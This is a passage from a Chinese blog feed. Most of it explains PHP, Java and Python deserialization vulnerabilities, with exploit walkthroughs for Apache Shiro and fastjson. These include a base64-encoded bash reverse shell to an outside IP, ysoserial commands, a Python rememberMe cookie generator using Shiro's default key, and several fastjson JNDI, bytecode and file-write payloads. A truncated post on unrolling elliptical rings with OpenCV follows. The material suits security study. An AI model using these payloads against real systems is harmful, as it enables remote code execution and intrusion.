class="hljs-comment">//file_put_contents(&quot;serialize.txt&quot;, $data);</span><br><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;serialize.txt&quot;</span> );<br><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$data</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">get_flag</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>反序列化之后输出的flag的值就变成了Active。我们看到本来存储在文件中的一串字符，在 uiseralize() 的作用下还原成了对象，并且实现了属性和方法的调用。</p><p>此时如果我们修改serialize.txt的内容，会发生什么呢？</p><p>我们把<code>s:6:&quot;Active&quot;;</code>更改成<code>s:6:&quot;Hacked&quot;;</code>，结果就会输出了Hacked，是不是很神奇呢。</p><h3 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h3><p>PHP反序列化是开发者不能参与的，开发者调用serialize函数以后，序列化的数据就已经完成了，得到的是一个完整的对象，并不能在序列化流里新增某一个内容，如果想插入新的内容，只有将其保存在一个属性中。也就是说PHP的序列化、反序列化是一个纯内部的过程，而其_sleep、_wakeup魔术方法的目的就是在序列化、反序列化的前后执行一些操作。</p><p>Java反序列化的操作，很多是需要开发者深入参与的，可以发现大量的库会实现readObject、 writeObject方法<br>这和_sleep、 _wakeup很少使用是存在鲜明对比的。</p><p>Python反序列化和Java、php有个显著的区别，就是Python的反序列化过程实际上是在执行一个基于栈的虚拟机。我们可以栈上增、删对象，也可以执行一些指令，比如函数的执行等，甚至可以用这个虚拟机执行一个完整的应用程序。所以，Python的反序列化可以立即导致任意函数、命令执行漏洞，与需要gadget的php和java相比更加危险。</p><h2 id="反序列化漏洞成因"><a href="#反序列化漏洞成因" class="headerlink" title="反序列化漏洞成因"></a>反序列化漏洞成因</h2><h3 id="JAVA反序列化漏洞"><a href="#JAVA反序列化漏洞" class="headerlink" title="JAVA反序列化漏洞"></a>JAVA反序列化漏洞</h3><p>Java 序列化机制虽然有默认序列化机制，但也支持用户自定义的序列化与反序列化策略。例如对象的一些成员变量没必要序列化保存或传输，就可以不序列化，或者也可以对一些敏感字段进行处理等自定义对象序列化的行为，而自定义序列化规则的方式就是重写 writeObejct 与 readObject。当对象重写了 writeObejct 或 readObject方法时，Java 序列化与反序列化就会调用用户自定义的逻辑。</p><p>我们把上面的例子添加一句代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 自定义反序列化方法，定义自己的字节流读取方式</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><br>        <span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;<br>    s.defaultReadObject();<br>    Base64.<span class="hljs-type">Decoder</span> <span class="hljs-variable">decoder</span> <span class="hljs-operator">=</span> Base64.getDecoder();<br>    Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc.exe&quot;</span>); <span class="hljs-comment">//添加的一句执行弹出计算器</span><br>    pwd = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(decoder.decode(pwd), <span class="hljs-string">&quot;UTF-8&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>这个exec的内容如果是外部输入可以控制的，那么这里就会引发远程命令执行。当然，大多数开发人员不会写出这么离谱的代码，这只是一个最简单的示例，用来说明反序列化漏洞。</p><h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><p>反序列化对象重写了反序列化函数 <code>readObject</code>，并且 <code>readObject</code> 方法存在执行命令的机会。</p><h4 id="举个例子CC6链"><a href="#举个例子CC6链" class="headerlink" title="举个例子CC6链"></a>举个例子CC6链</h4><p><code>InvokerTransformer</code>类中天然的有一个调用invoke方法的transform方法，并且是可控的，可以用来执行命令，<code>ChainedTransformer</code>类调用了这个类的transform方法，然后<code>TiedMapEntry</code>类中的<code>getValue()</code>方法调用了<code>LazyMap</code>的<code>get()</code>方法，然后<code>hashCode()</code>方法中调用<code>getValue()</code>方法，然而HashMap类的put方法会自动调用hash方法，到此我们就可以反向地构造出EXP：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">xxx.read<span class="hljs-constructor">Object()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>put<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>hash<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TiedMapEntry</span>.</span></span>hash<span class="hljs-constructor">Code()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TiedMapEntry</span>.</span></span>get<span class="hljs-constructor">Value()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LazyMap</span>.</span></span>get<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure><h3 id="Java反序列化漏洞实例–shiro反序列化漏洞"><a href="#Java反序列化漏洞实例–shiro反序列化漏洞" class="headerlink" title="Java反序列化漏洞实例–shiro反序列化漏洞"></a>Java反序列化漏洞实例–shiro反序列化漏洞</h3><h4 id="shiro"><a href="#shiro" class="headerlink" title="shiro"></a>shiro</h4><p>Apache Shiro是一个强大且易用的Java安全框架，执行身份验证、授权、密码和会话管理。</p><h4 id="shiro指纹特征"><a href="#shiro指纹特征" class="headerlink" title="shiro指纹特征"></a>shiro指纹特征</h4><p>在请求包的Cookie中为 rememberMe字段赋任意值，收到返回包的 Set-Cookie 中存在 rememberMe&#x3D;deleteMe 字段，说明目标有使用Shiro框架，可以进一步测试。</p><h4 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h4><p>Apache Shiro框架提供了记住我的功能（RememberMe），用户登陆成功后会生成经过加密并编码的cookie，在服务端接收cookie值后，Base64解码–&gt;AES解密–&gt;反序列化。攻击者只要找到AES加密的密钥，就可以构造一个恶意对象，对其进行序列化–&gt;AES加密–&gt;Base64编码，然后将其作为cookie的rememberMe字段发送，Shiro将rememberMe进行解密并且反序列化，最终造成反序列化漏洞。</p><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>攻击者监听某一端口：</p><p>nc -lvvp 8886</p><p>编码交互式反弹shell：base64内容为bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;202.120.1.65&#x2F;8886 0&gt;&amp;1</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">bash -c </span><span class="hljs-template-variable">&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8yMDIuMTIwLjEuNjUvODg4NiAwPiYx&#125;</span><span class="language-xml">|</span><span class="hljs-template-variable">&#123;base64,-d&#125;</span><span class="language-xml">|</span><span class="hljs-template-variable">&#123;bash,-i&#125;</span><br></code></pre></td></tr></table></figure><p>进入<a href="https://github.com/frohoff/ysoserial">GitHub - frohoff&#x2F;ysoserial: A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.</a>用于生成利用不安全 Java 对象反序列化的有效payload。</p><p>通过ysoserial中JRMP监听模块，监听6666端口并执行反弹shell命令</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">java </span>-cp ysoserial.<span class="hljs-keyword">jar </span>ysoserial.exploit.<span class="hljs-keyword">JRMPListener </span><span class="hljs-number">6666</span> CommonsCollections4 <span class="hljs-string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8yMDIuMTIwLjEuNjUvODg4NiAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br></code></pre></td></tr></table></figure><p>poc:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># python2</span><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encode_rememberme</span>(<span class="hljs-params">command</span>):<br> <br>    popen = subprocess.Popen([<span class="hljs-string">&#x27;java&#x27;</span>, <span class="hljs-string">&#x27;-jar&#x27;</span>, <span class="hljs-string">&#x27;ysoserial-all.jar&#x27;</span>, <span class="hljs-string">&#x27;JRMPClient&#x27;</span>, command], stdout=subprocess.PIPE)<br>    BS = AES.block_size<br>    pad = <span class="hljs-keyword">lambda</span> s: s + ((BS - <span class="hljs-built_in">len</span>(s) % BS) * <span class="hljs-built_in">chr</span>(BS - <span class="hljs-built_in">len</span>(s) % BS)).encode()<br>    key = base64.b64decode(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>) <span class="hljs-comment"># key</span><br>    iv = uuid.uuid4().<span class="hljs-built_in">bytes</span><br>    encryptor = AES.new(key, AES.MODE_CBC, iv)<br>    file_body = pad(popen.stdout.read())<br>    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))<br>    <span class="hljs-keyword">return</span> base64_ciphertext<br> <br> <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    payload = encode_rememberme(sys.argv[<span class="hljs-number">1</span>])<br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;rememberMe=&#123;0&#125;&quot;</span>.<span class="hljs-built_in">format</span>(payload.decode())<br></code></pre></td></tr></table></figure><p>将生成的POC替换到Cookie中rememberMe即可。</p><h3 id="Java反序列化漏洞实例–fastjson反序列化漏洞"><a href="#Java反序列化漏洞实例–fastjson反序列化漏洞" class="headerlink" title="Java反序列化漏洞实例–fastjson反序列化漏洞"></a>Java反序列化漏洞实例–fastjson反序列化漏洞</h3><h4 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h4><p>fastjson是java的一个库，可以将java对象转化为json格式的字符串，也可以将json格式的字符串转化为java对象</p><p>提供了 toJSONString() 和 parseObject() 方法来将 Java 对象与 JSON 相互转换。调用toJSONString方 法即可将对象转换成 JSON 字符串，parseObject 方法则反过来将 JSON 字符串转换成对象。</p><h4 id="漏洞成因-1"><a href="#漏洞成因-1" class="headerlink" title="漏洞成因"></a>漏洞成因</h4><p>fastjson在1.2.24及之前没有任何防御策略，且autotype默认开启</p><p>fastjson反序列化一个类的时候，他会调用成员变量的set方法，所以首先会调用一个setdataSourceName的方法，其次会调用setautoCommit的方法，</p><p>setdataSourceName：</p><p>就是赋值，把rmi那个值赋给数据源</p><p>setAutoCommit：</p><p>setAutoCommit中调用了connect( )方法，connect方法会调用InitialContext.lookup(this.getDataSourceName())方法，而this.getDataSourceName()参数就是payload中dataSourceName对应的JNDI名称。</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">&#123;  &quot;<span class="hljs-keyword">@type</span><span class="hljs-string">&quot;:&quot;</span>com.sun.JdbcRowSetImpl<span class="hljs-string">&quot;,  &quot;</span>dataSourceName<span class="hljs-string">&quot;:&quot;</span><span class="hljs-attribute">ldap</span>://<span class="hljs-attribute">localhost</span>:<span class="hljs-number">1389</span>/Exploit<span class="hljs-string">&quot;,  &quot;</span>autoCommit<span class="hljs-string">&quot;:true&#125;</span><br></code></pre></td></tr></table></figure><p>因此在反序列时，payload中的dataSourceName和autoCommit通过setDataSourceName和setAutoCommit进行赋值，而在setAutoCommit中会调用connect方法，connect方法中又调用了lookup()方法，lookup在传入的参数就是JNDI名称，因此导致可以利用rmi&#x2F;ldap方法进行远程调用。</p><p>fastjson在反序列化json字符时，可以通过autoType来指定反序列化的类，并调用相关方法的set方法（这里调用了dataSourceName和autoCommit方法，反序列化后自动会调用setdataSourceName和setautoCommit方法并把参数传入），而setautoCommit方法中调用了connect方法，connect方法中调用了lookup方法，可以通过JNDI去访问LDAP、RMI等服务，又因为ldap存在命名引用，如果不存在指定文件，就会去指定的url下载到本地,如果下载的.class文件包含无参构造函数和静态代码块就会被自动执行，从而造成任意代码执行。</p><p>高版本默认关闭autoCommit，这时候需要利用白名单中可以生成实例的类去进行利用，比如Throwable和AutoCloseable，刚好为expectClass的子类，那么接下来就能生成typename的对象，从而达成绕过autotype的目的。</p><p> 和log4j JNDI注入漏洞极其相似，都是因为lookup方法没有进行限制导致的漏洞，但前期利用的方式缺不同，fastjson是通过autoType来反序列化JdbcRowSetlmpl类，通过setautoCommit方法调用到lookup方法，而log4j是因为日志调用方法中调用了lookup方法。</p><h4 id="不出网的情况"><a href="#不出网的情况" class="headerlink" title="不出网的情况"></a>不出网的情况</h4><p>参考<a href="https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html">BCEL ClassLoader去哪了 | 离别歌 (leavesongs.com)</a></p><p><strong>TemplatesImpl利用链</strong> 版本 1.2.24<br>条件：</p><ol><li><p>服务端使用parseObject()时，必须使用如下格式才能触发漏洞： JSON.parseObject(input, Object.class, Feature.SupportNonPublicField);</p></li><li><p>服务端使用parse()时，需要 JSON.parse(text1,Feature.SupportNonPublicField)<br>这是因为com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl需要赋值的一些属性为private 属性，要满足private属性的数据。</p></li></ol><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;_bytecodes&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;yv66vgAAADQA...CJAAk=&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;_name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;s&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;_tfactory&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;_outputProperties&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>@type——指定的解析类，即com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl，Fastjson根据指定类去反序列化得到该类的实例，在默认情况下只会去反序列化public修饰的属性，在PoC中，_bytecodes和_name都是私有属性，所以想要反序列化这两个属性，需要在parseObject()时设置Feature.SupportNonPublicField；<br>_bytecodes——是我们把恶意类的.class文件二进制格式进行Base64编码后得到的字符串；<br>_outputProperties——漏洞利用链的关键会调用其参数的getOutputProperties()方法，进而导致命令执行；<br>_tfactory:{}，_name——为了满足漏洞点触发之前不报异常及退出，我们还需要满足 _name 不为 null ，_tfactory 不为 null；</p><p><strong>BasicDataSource利用链</strong></p><p><code>BasicDataSource</code>的<code>toString()</code>方法会遍历这个类的所有getter并执行，于是通过<code>getConnection()-&gt;createDataSource()-&gt;createConnectionFactory()</code>的调用关系，调用到了<code>createConnectionFactory</code>方法，在<code>createConnectionFactory</code>方法中，调用了<code>Class.forName(driverClassName, true, driverClassLoader)</code>，driverClassName、driverClassLoader都是外部可控的，第二个参数为true时可以直接加载static{}块中的代码，因此我们可以将ClassLoader设置为<code>com.sun.org.apache.bcel.internal.util.ClassLoader</code>，使其加载字节码并执行命令：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;aaa&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;driverClassLoader&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br>                <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;driverClassName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$$BCEL$$$l$8b$I$A$...&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;bbb&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><strong>commons-io写文件</strong></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;x&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;sun.rmi.server.MarshalOutputStream&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;out&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.util.zip.InflaterOutputStream&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;out&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.io.FileOutputStream&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;file&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;/tmp/dest.txt&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;append&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">false</span></span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;infl&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;input&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;eJwL8nUyNDJSyCxWyEgtSgUAHKUENw==&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;bufLen&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1048576</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;protocolVersion&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>知道web路径可以写webshell，权限更高可以写定时任务、免密钥</p>]]></content>
    
    
    
    <tags>
      
      <tag>反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用Python和极坐标变换将椭圆环展开为矩形</title>
    <link href="/blog/2021/03/09/%E4%BD%BF%E7%94%A8Python%E5%92%8C%E6%9E%81%E5%9D%90%E6%A0%87%E5%8F%98%E6%8D%A2%E5%B0%86%E6%A4%AD%E5%9C%86%E7%8E%AF%E5%B1%95%E5%BC%80%E4%B8%BA%E7%9F%A9%E5%BD%A2/"/>
    <url>/blog/2021/03/09/%E4%BD%BF%E7%94%A8Python%E5%92%8C%E6%9E%81%E5%9D%90%E6%A0%87%E5%8F%98%E6%8D%A2%E5%B0%86%E6%A4%AD%E5%9C%86%E7%8E%AF%E5%B1%95%E5%BC%80%E4%B8%BA%E7%9F%A9%E5%BD%A2/</url>
    
    <content type="html"><![CDATA[<p><strong>最近的工作中遇到了一个问题，查了挺久发现没有相应的实现方式，于是自己摸索着写了一个椭圆环展开成为矩形长条的python算法，记录一下备忘。</strong></p><p><img src="/images/fj56.jpg"></p><span id="more"></span><h2 id="0x00代码"><a href="#0x00代码" class="headerlink" title="0x00代码"></a>0x00代码</h2><p>废话不多说先上代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> cv2<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> math<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_word_by_circle</span>(<span class="hljs-params">img,circle_center,radius,radius_width</span>):<br>    black_img = np.zeros((radius_width,<span class="hljs-built_in">int</span>(radius[<span class="hljs-number">1</span>]*(radius[<span class="hljs-number">0</span>]+radius[<span class="hljs-number">1</span>])/radius[<span class="hljs-number">0</span>])+<span class="hljs-number">500</span>,<span class="hljs-number">3</span>),dtype=<span class="hljs-string">&#x27;uint8&#x27;</span>)<br>    <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,black_img.shape[<span class="hljs-number">0</span>]):<br>        <span class="hljs-keyword">for</span> col <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,black_img.shape[<span class="hljs-number">1</span>]):<br>            theta = <span class="hljs-number">0</span>-(math.pi*<span class="hljs-number">2</span>/black_img.shape[<span class="hljs-number">1</span>]*(col+<span class="hljs-number">1</span>)+<span class="hljs-number">1.57</span>)<br>            <br>            rho = <span class="hljs-built_in">int</span>((radius[<span class="hljs-number">0</span>]*radius[<span class="hljs-number">1</span>])/(((radius[<span class="hljs-number">1</span>]**<span class="hljs-number">2</span>)*(math.cos(theta)**<span class="hljs-number">2</span>)+(radius[<span class="hljs-number">0</span>]**<span class="hljs-number">2</span>)*(math.sin(theta)**<span class="hljs-number">2</span>))**<span class="hljs-number">0.5</span>))-row-<span class="hljs-number">1</span><br>            <br>            p_x = <span class="hljs-built_in">int</span>(circle_center[<span class="hljs-number">0</span>] + rho*math.cos(theta))<br>            p_y = <span class="hljs-built_in">int</span>(circle_center[<span class="hljs-number">1</span>] - rho*math.sin(theta))<br>            <br>            black_img[row,col,:] = img[p_y,p_x,:]<br>            <br>    <span class="hljs-keyword">return</span> black_img<br><br></code></pre></td></tr></table></figure><p>参数解释：</p><ul><li>img是用cv2.imread读入的带有椭圆的图片；circle_center指的是椭圆圆心的坐标数据，是一个列表，相对于左上角[x,y]；radius是一个列表，[长轴半径，短轴半径]；radius_width指的是椭圆环的宽度</li></ul><p>最终生成的矩形长条，以椭圆环的外周长为长（实际上由于展开的是椭圆的印章，便于查看，增加了长），以椭圆环的宽度为高。函数中，从椭圆环的最外圈开始遍历，最外圈即对应着矩形中的第一行，宽度为多少，则矩形中就有多少行。以圆心为中心构成极坐标系，则圆环上任意一点可以用rho和theta来表示，再根据公式计算出该点在图上的真实坐标，把像素值赋给矩形框中对应的位置，极坐标转换公式如下所示：</p><p><img src="/images/jizuobiao.jpg"></p><h2 id="0x01效果"><a href="#0x01效果" class="headerlink" title="0x01效果"></a>0x01效果</h2><p>效果图如下：</p><p><img src="/images/tyyz.png"></p><p><img src="/images/tyyzzk.png"></p><p>由于椭圆的定位准确度不如圆，因此展开还有一些文字扭曲问题，效果还是没有很理想，后续还会继续优化。</p><h2 id="0x02补充"><a href="#0x02补充" class="headerlink" title="0x02补充"></a>0x02补充</h2><p>由于某些椭圆是倾斜的，因此我们需要引入一个新的参数去定义椭圆的倾斜角度inclination，单位是rad，具体实现方案参考：<a href="https://jingyan.baidu.com/article/2c8c281dfbf3dd0009252a7b.html">https://jingyan.baidu.com/article/2c8c281dfbf3dd0009252a7b.html</a></p><p>代码如下，增加了坐标变换：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">import</span> cv2<br><span class="hljs-attribute">import</span> numpy as np<br><span class="hljs-attribute">import</span> math<br><br><span class="hljs-attribute">def</span> get_word_by_circle(img,circle_center,radius,radius_width,inclination):<br>    <span class="hljs-attribute">black_img</span> = np.zeros((radius_width,int(radius[<span class="hljs-number">1</span>]*(radius[<span class="hljs-number">0</span>]+radius[<span class="hljs-number">1</span>])/radius[<span class="hljs-number">0</span>])+<span class="hljs-number">500</span>,<span class="hljs-number">3</span>),dtype=&#x27;uint8&#x27;)<br>    <span class="hljs-attribute">for</span> row in range(<span class="hljs-number">0</span>,black_img.shape[<span class="hljs-number">0</span>]):<br>        <span class="hljs-attribute">for</span> col in range(<span class="hljs-number">0</span>,black_img.shape[<span class="hljs-number">1</span>]):<br>            <span class="hljs-attribute">theta</span> = <span class="hljs-number">0</span>-(math.pi*<span class="hljs-number">2</span>/black_img.shape[<span class="hljs-number">1</span>]*(col+<span class="hljs-number">1</span>)+<span class="hljs-number">1</span>.<span class="hljs-number">57</span>-inclination)<br>            <br>            <span class="hljs-attribute">rho</span> = int((radius[<span class="hljs-number">0</span>]*radius[<span class="hljs-number">1</span>])/(((radius[<span class="hljs-number">1</span>]**<span class="hljs-number">2</span>)*(math.cos(theta)**<span class="hljs-number">2</span>)+(radius[<span class="hljs-number">0</span>]**<span class="hljs-number">2</span>)*(math.sin(theta)**<span class="hljs-number">2</span>))**<span class="hljs-number">0</span>.<span class="hljs-number">5</span>))-row-<span class="hljs-number">1</span><br>            <br>            <span class="hljs-attribute">p_x</span> = circle_center[<span class="hljs-number">0</span>] + rho*math.cos(theta)<br>            <span class="hljs-attribute">p_y</span> = circle_center[<span class="hljs-number">1</span>] - 